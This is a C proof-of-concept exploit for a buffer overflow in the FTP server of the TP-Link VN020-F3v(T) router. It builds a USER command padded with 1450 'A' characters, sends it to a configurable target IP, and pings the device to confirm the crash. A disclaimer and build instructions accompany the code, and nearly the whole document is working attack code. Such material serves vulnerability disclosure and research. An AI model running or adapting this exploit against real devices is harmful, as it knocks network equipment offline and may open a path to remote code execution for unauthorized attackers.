/*
 * TP-Link VN020 FTP Server Memory Corruption Proof of Concept (PoC)
 *
 * @author Mohamed Maatallah
 *
 * Vulnerability Details:
 * ---------------------
 * - Target Device: TP-Link VN020-F3v(T) FTP Server
 * - Type: Memory Corruption / Buffer Overflow
 *
 * Vulnerability Overview:
 * ---------------------
 * The FTP server is vulnerable to a buffer overflow when processing
 * the USER command. By sending an overly long USER command (specifically
 * 1450 consecutive 'A' characters), the application's memory handling
 * mechanism fails, causing a crash or potential remote code execution.
 *
 * Technical Analysis:
 * -----------------
 * - Exploit Mechanism: Sends an oversized USER command during FTP login
 * - Payload Composition:
 *   1. "USER " prefix (5 bytes)
 *   2. 1450 consecutive 'A' characters
 *   3. "\r\n" line termination (2 bytes)
 *
 * Risk and Impact:
 * --------------
 * - Potential for Denial of Service (DoS)
 * - Possible Remote Code Execution (RCE)
 * - Affects FTP service authentication process
 *
 * Compilation Instructions (Visual Studio):
 * ---------------------------------------
 * 1. Open Visual Studio
 * 2. Create a new C Console Application
 * 3. Add these additional dependencies to project settings:
 *    - ws2_32.lib
 *    - iphlpapi.lib
 * 4. Ensure Windows SDK is installed
 * 5. Set Platform Toolset to latest v143 or v142
 * 6. Compile in Release or Debug mode
 *
 * Disclaimer:
 * ----------
 * This proof of concept is for educational and research purposes only.
 * Unauthorized testing without explicit permission is unethical and illegal.
 */

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <windows.h>
#include <iphlpapi.h>
#include <icmpapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

 // Target configuration - MODIFY BEFORE TESTING
#define DEST_IP "192.168.1.1"     // IP of target FTP server
#define DEST_PORT 21               // Standard FTP port
#define PING_TIMEOUT_MS 1000       // Network timeout
#define MAX_PING_RETRIES 5         // Connectivity check attempts

// 1450: Instant
// 1100: Delayed
#define CRASH_STRING_LENGTH 1450   // Exact number of 'A's triggering instantcrash
#define TOTAL_PAYLOAD_LENGTH (CRASH_STRING_LENGTH + 5 + 2)  // USER + As + \r\n

typedef struct {
    HANDLE icmp_handle;
    IPAddr target_addr;
    LPVOID reply_buffer;
    DWORD reply_size;
} ping_context_t;

void log_msg(const char* prefix, const char* msg) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    printf("[%02d:%02d:%02d] %s %s\n", st.wHour, st.wMinute, st.wSecond, prefix, msg);
}

void hexdump(const char* desc, const void* addr, const int len) {
    int i;
    unsigned char buff[17];
    const unsigned char* pc = (const unsigned char*)addr;

    if (desc != NULL)
        printf("%s:\n", desc);

    for (i = 0; i < len; i++) {
        if ((i % 16) == 0) {
            if (i != 0)
                printf("  %s\n", buff);
            printf("  %04x ", i);
        }

        printf(" %02x", pc[i]);

        if ((pc[i] < 0x20) || (pc[i] > 0x7e))
            buff[i % 16] = '.';
        else
            buff[i % 16] = pc[i];
        buff[(i % 16) + 1] = '\0';
    }

    while ((i % 16) != 0) {
        printf("   ");
        i++;
    }

    printf("  %s\n", buff);
}

BOOL check_connectivity(ping_context_t* ctx) {
    char send_buf[32] = { 0 };
    return IcmpSendEcho(ctx->icmp_handle, ctx->target_addr, send_buf, sizeof(send_buf),
        NULL, ctx->reply_buffer, ctx->reply_size, PING_TIMEOUT_MS) > 0;
}

char* generate_exact_crash_payload() {
    char* payload = (char*)malloc(TOTAL_PAYLOAD_LENGTH + 1);  // +1 for null terminator
    if (!payload) {
        log_msg("[-]", "Failed to allocate payload memory");
        return NULL;
    }

    // Construct the exact payload that causes crash
    strcpy(payload, "USER ");                            // 5 bytes
    memset(payload + 5, 'A', CRASH_STRING_LENGTH);      // 1450 'A's
    memcpy(payload + 5 + CRASH_STRING_LENGTH, "\r\n", 2); // 2 bytes
    payload[TOTAL_PAYLOAD_LENGTH] = '\0';

    char debug_msg[100];
    snprintf(debug_msg, sizeof(debug_msg), "Generated payload of length %d ('A's + 5 byte prefix + 2 byte suffix)",
        TOTAL_PAYLOAD_LENGTH);
    log_msg("[*]", debug_msg);

    return payload;
}

BOOL send_crash_payload(const char* target_ip, uint16_t target_port) {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;
    char server_reply[2048];
    int recv_size;
    ping_context_t ping_ctx = { 0 };
    BOOL success = FALSE;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        log_msg("[-]", "Winsock initialization failed");
        return FALSE;
    }

    // Setup ICMP for connectivity monitoring
    ping_ctx.icmp_handle = IcmpCreateFile();
    ping_ctx.reply_size = sizeof(ICMP_ECHO_REPLY) + 32;
    ping_ctx.reply_buffer = malloc(ping_ctx.reply_size);
    inet_pton(AF_INET, target_ip, &ping_ctx.target_addr);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        log_msg("[-]", "Socket creation failed");
        goto cleanup;
    }

    // Setup server address
    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server.sin_addr);

    // Connect to FTP server
    log_msg("[*]", "Connecting to target FTP server...");
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        log_msg("[-]", "Connection failed");
        goto cleanup;
    }
    log_msg("[+]", "Connected successfully");

    // Verify initial connectivity
    if (!check_connectivity(&ping_ctx)) {
        log_msg("[-]", "No initial connectivity to target");
        goto cleanup;
    }

    // Receive banner
    if ((recv_size = recv(sock, server_reply, sizeof(server_reply) - 1, 0)) == SOCKET_ERROR) {
        log_msg("[-]", "Failed to receive banner");
        goto cleanup;
    }
    server_reply[recv_size] = '\0';
    log_msg("[*]", server_reply);

    // Generate and send the exact crash payload
    char* payload = generate_exact_crash_payload();
    if (!payload) {
        goto cleanup;
    }

    log_msg("[*]", "Sending crash payload...");
    hexdump("Payload hex dump (first 32 bytes)", payload, 32);

    if (send(sock, payload, TOTAL_PAYLOAD_LENGTH, 0) < 0) {
        log_msg("[-]", "Failed to send payload");
        free(payload);
        goto cleanup;
    }
    free(payload);
    log_msg("[+]", "Payload sent successfully");

    // Monitor for crash
    log_msg("[*]", "Monitoring target status...");
    Sleep(1000);  // Wait a bit for crash to take effect

    int failed_pings = 0;
    for (int i = 0; i < MAX_PING_RETRIES; i++) {
        if (!check_connectivity(&ping_ctx)) {
            failed_pings++;
            if (failed_pings >= 3) {
                log_msg("[+]", "Target crash confirmed!");
                success = TRUE;
                goto cleanup;
            }
        }
        Sleep(500);
    }

    log_msg("[-]", "Target appears to still be responsive");

cleanup:
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if (ping_ctx.icmp_handle != INVALID_HANDLE_VALUE) {
        IcmpCloseHandle(ping_ctx.icmp_handle);
    }
    if (ping_ctx.reply_buffer) {
        free(ping_ctx.reply_buffer);
    }
    WSACleanup();
    return success;
}

int main(void) {
    printf("\nTP-Link VN020 FTP Memory Corruption PoC\n");
    printf("---------------------------------------\n");
    printf("Target: %s:%d\n", DEST_IP, DEST_PORT);
    if (send_crash_payload(DEST_IP, DEST_PORT)) {
        printf("\nExploit successful - target crashed\n");
    }
    else {
        printf("\nExploit failed - target may be patched\n");
    }

    return 0;
}